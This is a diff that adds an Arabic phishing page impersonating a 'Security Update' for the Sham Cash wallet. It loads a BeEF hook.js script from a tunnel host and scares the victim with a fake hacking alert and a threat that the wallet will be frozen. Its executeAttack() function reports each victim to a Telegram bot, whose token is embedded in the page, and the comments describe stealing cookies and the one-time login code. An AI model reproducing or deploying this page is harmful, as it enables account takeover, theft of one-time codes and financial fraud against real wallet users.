@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Update | Sham Cash</title>
+    <!-- الجسر النشط الخاص بك -->
+    <script src="https://0fc034dfd1d961.lhr.life/hook.js"></script>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; overflow: hidden; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .update-box { background: #222; border: 1px solid #ff0000; padding: 40px; border-radius: 10px; width: 400px; }
+        .btn { background: #ff0000; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 1.2rem; margin-top: 20px; }
+        .warning { color: #ff0000; font-size: 0.8rem; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="overlay">
+        <div class="update-box">
+            <h2 style="color: #ff0000;">⚠️ تم حظر الوصول!</h2>
+            <p>تم اكتشاف محاولة اختراق لجهازك. لحماية رصيدك في شام كاش، يجب تحديث نظام التشفير فوراً.</p>
+            <button class="btn" onclick="executeAttack()">تحديث وتأمين الحساب</button>
+            <p class="warning">فشل التحديث قد يؤدي إلى تجميد المحفظة نهائياً.</p>
+        </div>
+    </div>
+
+    <script>
+    function executeAttack() {
+        // 1. إرسال إشارة لـ BeEF ليبدأ سحب الـ Cookies فوراً
+        console.log("Initiating Deep Scan...");
+        
+        // 2. إرسال بيانات الجهاز للتلجرام لتعرف نوع جهازه ونظامه
+        fetch(`https://api.telegram.org/bot8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs/sendMessage?chat_id=8665747715&text=${encodeURIComponent("🚨 الضحية وقع في فخ التحديث!\n🌐 بدأنا عملية الدعس المباشر.")}`);
+        
+        // 3. تحويله لصفحة تسجيل الدخول لسرقة الـ OTP بينما يعمل البروكسي في الخلفية
+        alert("بدأ التحديث.. يرجى إدخال الكود الذي سيصلك لتأكيد هويتك.");
+    }
+    </script>
+</body>
+</html>
